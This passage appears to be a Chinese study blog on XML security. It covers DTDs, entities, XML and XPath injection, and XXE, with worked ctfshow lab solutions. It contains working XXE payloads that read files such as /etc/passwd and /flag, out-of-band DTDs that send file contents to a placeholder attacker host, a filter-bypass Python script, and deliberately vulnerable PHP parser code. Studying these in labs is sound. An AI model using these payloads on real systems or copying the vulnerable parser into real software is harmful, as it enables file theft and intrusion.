class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><span class="hljs-comment">&lt;!--定义body元素为”#PCDATA”类型--&gt;</span><br></code></pre></td></tr></table></figure><p><strong>PCDATA</strong><br>PCDATA 的意思是被解析的字符数据。PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。<br>被解析的字符数据不应当包含任何<code>&amp;</code>，<code>&lt;</code>，或者<code>&gt;</code>字符，需要用<code>&amp;amp</code> <code>&amp;lt</code> <code>&amp;gt</code>实体来分别替换。<br><strong>CDATA</strong><br>CDATA 意思是字符数据，CDATA 是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</p><ul><li><input checked="" disabled="" type="checkbox"> 内部引用</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE 根元素 [body]&gt;</span><br></code></pre></td></tr></table></figure><p>即 DTD 在 XML 文件内，如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?XML version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">note</span> [&lt;!--定义此文档是 note 类型的文档--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">to</span>,<span class="hljs-meta-keyword">from</span>,<span class="hljs-meta-keyword">heading</span>,<span class="hljs-meta-keyword">body</span>)&gt;</span>&lt;!--定义note元素有四个元素--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">to</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span>&lt;!--定义to元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">from</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span>&lt;!--定义from元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">head</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span>&lt;!--定义head元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">body</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span>&lt;!--定义body元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Y0u<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>@re<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>v3ry<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>g00d!<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h3><p><strong>实体使用方式</strong>：分为内部声明实体和引用外部实体</p><ul><li><input checked="" disabled="" type="checkbox"> 内部实体</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY 实体名称 <span class="hljs-meta-string">&quot;实体的值&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>示例代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?XML version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">test</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">writer</span> <span class="hljs-meta-string">&quot;Dawn&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">copyright</span> <span class="hljs-meta-string">&quot;Copyright W3School.com.cn&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span><span class="hljs-symbol">&amp;writer;</span>©right;<span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br></code></pre></td></tr></table></figure><p>DTD 在 XML 文档中</p><ul><li><input checked="" disabled="" type="checkbox"> 外部实体</li></ul><p>外部实体，用来引入外部资源。有<code>SYSTEM</code>和<code>PUBLIC</code>两个关键字，表示实体来自本地计算机还是公共计算机。</p><p>通过引用<code>公用DTD</code></p><ul><li>网络上 DTD 文件</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE 根元素 <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;DTD_ID&quot;</span> <span class="hljs-meta-string">&quot;DTD_url&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>外部 DTD 文件</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE 根元素 <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;DTD本地路径&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>示例代码：</p><ul><li>网络上的外部 DTD 文件</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?XML version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">test</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">copyright</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span><span class="hljs-symbol">&amp;file;</span>©right;<span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>外部 DTD 文件</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?XML version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">root-element</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;XML.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Y0u<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>@re<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>v3ry<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>g00d!<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure><p>下面是 XML.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">to</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><span class="hljs-comment">&lt;!--定义to元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">from</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><span class="hljs-comment">&lt;!--定义from元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">head</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><span class="hljs-comment">&lt;!--定义head元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">body</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><span class="hljs-comment">&lt;!--定义body元素为”#PCDATA”类型--&gt;</span><br></code></pre></td></tr></table></figure><p>外部实体协议支持</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211204212420637.png"></p><h3 id="实体参数"><a href="#实体参数" class="headerlink" title="实体参数"></a>实体参数</h3><ul><li>通用实体</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?XML version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">updateProfile</span> [<span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///c:/windows/win.ini&quot;</span>&gt;</span> ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">updateProfile</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">firstname</span>&gt;</span>Joe<span class="hljs-tag">&lt;/<span class="hljs-name">firstname</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">lastname</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">lastname</span>&gt;</span><br>    ...<br><span class="hljs-tag">&lt;/<span class="hljs-name">updateProfile</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>参数实体</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">an-element</span> <span class="hljs-meta-string">&quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">remote-dtd</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://somewhere.example.org/remote.dtd&quot;</span>&gt;</span><br>%an-element; %remote-dtd;<br></code></pre></td></tr></table></figure><blockquote><p>对于参数实体：</p><p>1.使用 <code>% 实体名</code>(<strong>这里面空格不能少</strong>) 在 DTD 中定义，并且<strong>只能在 DTD 中使用 <code>%实体名;</code> 引用</strong> 2.只有在 DTD 文件中，参数实体的声明才能引用其他实体 3.和通用实体一样，参数实体也可以外部引用</p></blockquote><h1 id="XML-注入"><a href="#XML-注入" class="headerlink" title="XML 注入"></a>XML 注入</h1><p>在用户能控制输入时，改变闭合即可注入</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002645-e7aed0d2-ec17-1.png"></p><p>通过 XML 注入添加了一个名为 USER2 的管理员账户。<br>XML 注入两大要素：<strong>标签闭合和获取 XML 表结构</strong></p><h1 id="XPath-注入"><a href="#XPath-注入" class="headerlink" title="XPath 注入"></a>XPath 注入</h1><p>XPath 注入攻击是指利用 XPath 解析器的松散输入和容错特性，能够在 URL、表单或其它信息上附带恶意的 XPath 查询代码，以获得权限信息的访问权并更改这些信息。XPath 注入攻击是针对 Web 服务应用新的攻击方法，它允许攻击者在事先不知道 XPath 查询相关知识的情况下，通过 XPath 查询得到一个 XML 文档的完整内容。</p><p>XPath 注入发生在当站点使用用户输入的信息来构造请求以获取 XML 数据。攻击者对站点发送经过特殊构造的信息来探究站点使用的 XML 是如何构造的，从而进一步获取正常途径下无法获取的数据。当 XML 数据被用作账户验证时，攻击者还可以提升他的权限。</p><p>XPath 注入攻击同 SQL 注入攻击类似，但与 SQL 注入相比，XPath 具有的优势：</p><ol><li>广泛性<br>只要是利用 XPath 语法的 Web 应用程序若未对输入的 XPath 查询做严格的处理都会存在 XPath 注入漏洞。而在 SQL 注入攻击过程中根据数据库支持的 SQL 语言不同，注入攻击的实现可能不同。</li><li>危害性大<br>XPath 语言几乎可以没有访问控制限制的引用 XML 文档的所有部分。而在 SQL 注入中，一个“<code>用户</code>”的权限可能被限制到 某一特定的表、列或者查询。<br>XPath 注入攻击可以保证得到完整的 XML 文档，即完整的数据库。只要 Web 服务应用具有基本的安全漏洞，即可构造针对 XPath 应用的自动攻击。</li></ol><p>学习 sql 注入时要学习数据库语言，同样这里要学习 XML 的语言 XPtah</p><p><a href="https://www.freebuf.com/column/211251.html">https://www.freebuf.com/column/211251.html</a></p><p>后续补</p><h1 id="XXE-XML-外部实体注入"><a href="#XXE-XML-外部实体注入" class="headerlink" title="XXE(XML 外部实体注入)"></a>XXE(XML 外部实体注入)</h1><p>通过 XXE 可以实现敏感文件读取，PHP RCE 执行，内网探测(发现主机，扫描端口，内网盲注等)，文件上传，拒绝服务攻击</p><p>实验</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    libxml_disable_entity_loader (<span class="hljs-literal">false</span>);<br>    <span class="hljs-variable">$xmlfile</span> = file_get_contents(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> DOMDocument();<br>    <span class="hljs-variable">$dom</span>-&gt;loadXML(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>    <span class="hljs-variable">$creds</span> = simplexml_import_dom(<span class="hljs-variable">$dom</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$creds</span>;<br></code></pre></td></tr></table></figure><ul><li><code>file_get_contents</code>获取客户端输入内容</li><li><code>new DOMDocument()</code>初始化 XML 解析器</li><li><code>loadXML($xmlfile)</code>加载客户端输入的 XML 内容</li><li><code>simplexml_import_dom($dom)</code>获取 XML 文档节点，如果成功则返回 SimpleXMLElement 对象，如果失败则返回 FALSE。</li></ul><p>引入内部实体：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">xxe</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///c:/windows/system32/drivers/etc/hosts&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211204230757218.png"></p><ul><li>ctfshow373</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>libxml_disable_entity_loader(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = file_get_contents(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> DOMDocument();<br>    <span class="hljs-variable">$dom</span>-&gt;loadXML(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>    <span class="hljs-variable">$creds</span> = simplexml_import_dom(<span class="hljs-variable">$dom</span>);<br>    <span class="hljs-variable">$ctfshow</span> = <span class="hljs-variable">$creds</span>-&gt;ctfshow;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$ctfshow</span>;<br>&#125;<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p>获取输入，初始化 XML 解析器，加载客服端输入的 XML 内容，获取到 XML 文档节点，将 dom 节点转换为 SimpleXMLElement 对象即 creds，输出 creds 中的变量 ctfshow</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">xxe</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ctfshow</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ctfshow</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>ctfshow374</li></ul><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">test</span> [</span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">evil</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://ip:2333/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml"></span></span><span class="perl">%evil;</span><span class="xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="xml"></span></span><span class="perl">%dtd;</span><span class="xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="xml"></span></span><span class="perl">%xxe;</span><br></code></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">dtd</span> <span class="hljs-meta-string">&quot;&lt;!ENTITY &amp;#x25; xxe SYSTEM &#x27;http://vps:2333/%file;&#x27;&gt; &quot;</span>&gt;</span></span><br><span class="xml"></span><span class="perl">%dtd;</span><span class="xml"></span><br><span class="xml"></span><span class="perl">%xxe;</span><br></code></pre></td></tr></table></figure><blockquote><p>python3 -m http.server 2333</p></blockquote><p>可以公用一个端口，也可以区分开，如下</p><ul><li>ctfshow 375</li></ul><p>在 374 的基础上进行过滤</p><blockquote><p>if(preg_match(‘/&lt;?xml version=”1.0”/‘, $xmlfile)){ die(‘error’); }</p></blockquote><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">test</span> [</span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">evil</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://ip:2333/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml"></span></span><span class="perl">%evil;</span><span class="xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="xml"></span></span><span class="perl">%dtd;</span><span class="xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="xml"></span></span><span class="perl">%xxe;</span><br></code></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">dtd</span> <span class="hljs-meta-string">&quot;&lt;!ENTITY &amp;#x25; xxe SYSTEM &#x27;http://vps:1234/%file;&#x27;&gt; &quot;</span>&gt;</span></span><br><span class="xml"></span><span class="perl">%dtd;</span><span class="xml"></span><br><span class="xml"></span><span class="perl">%xxe;</span><br></code></pre></td></tr></table></figure><blockquote><p>python3 -m http.server 2333</p><p>python3 -m http.server 1234</p></blockquote><ul><li>ctfshow 377</li></ul><p>过滤了 http 协议，用 utf16 编码绕过，python 发包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://d7a2ee70-cbf2-4e93-b189-e52a4c8dfee9.challenge.ctf.show/&#x27;</span><br>payload = <span class="hljs-string">&quot;&quot;&quot;&lt;!DOCTYPE test [</span><br><span class="hljs-string">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="hljs-string">&lt;!ENTITY % aaa SYSTEM &quot;http://ip/evil.dtd&quot;&gt;</span><br><span class="hljs-string">%aaa;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&lt;root&gt;123&lt;/root&gt;&quot;&quot;&quot;</span><br>payload = payload.encode(<span class="hljs-string">&#x27;utf-16&#x27;</span>)<br>requests.post(url ,data=payload)<br></code></pre></td></tr></table></figure><p>服务器配置 evil.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">dtd</span> <span class="hljs-meta-string">&quot;&lt;!ENTITY &amp;#x25; xxe SYSTEM &#x27;http://ip/%file;&#x27;&gt; &quot;</span>&gt;</span><br>%dtd;<br>%xxe;<br></code></pre></td></tr></table></figure><ul><li>ctfshow378</li></ul><p>是 xxe-lab 的 php-xxe</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">xxe</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file://flag&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>当文件内容包含大量<code>&lt; &gt; &amp; &quot;</code>等会出现报错</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">xxe</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///D:/1.txt&quot;</span>&gt;</span> ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211205152814834.png"></p><ul><li>服务端有回显</li></ul><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">roottag</span> [</span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">start</span> <span class="hljs-meta-string">&quot;&lt;![CDATA[&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///含&lt;&gt;&amp;&quot;</span>等的文件<span class="hljs-meta-string">&quot;&gt;</span></span></span></span><br><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta"><span class="xml">&lt;!ENTITY % end &quot;</span>]]&gt;</span>&quot;&gt;</span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">dtd</span> <span class="hljs-meta-keyword">SYSTEM</span> <span 